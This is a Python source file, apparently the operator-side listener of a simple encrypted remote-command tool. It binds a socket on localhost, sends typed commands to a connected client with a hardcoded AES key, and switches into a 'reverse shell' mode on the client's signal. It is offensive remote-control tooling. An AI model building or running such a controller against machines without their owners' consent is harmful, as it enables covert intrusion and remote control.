import Crypto.Cipher.AES as aes
import os
import utils

from socket import socket

key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
host = "127.0.0.1"
port = 1005

sock = socket()
sock.bind((host, port))

sock.listen(5)  # listen for client connection. The number stands for: number of unaccepted connections that the system will allow before refusing new connections
conn, addr = sock.accept()  # Establish connection with client. conn: new socket object used to send and receive data. addr address bound to the socket of the client.
print('Got connection from', addr)

reverse_shell = False

while True:
    if reverse_shell:
        inpt = input("Shell >")
    else:
        inpt = input("Enter command:")
    conn.sendall(utils.encrypt(data=inpt.encode("utf-8"), dtype="msg"))
    recv, dtype = utils.decrypt(conn.recv(1024))  #Data recieved from the socket. 1024 is the maximum amount of data to be received at once
    if recv:
        if dtype == "msg":
            if recv == "terminated":
                print("Terminated client. Good bye!")
                break
            elif recv == "reverse shell activated":
                reverse_shell = True
            elif recv == "reverse shell deactivated":
                reverse_shell = False
            elif recv == "received":
                pass
            else:
                print(recv)
        else:
            pass # received file, do something!

conn.close()
print("Connection closed.")
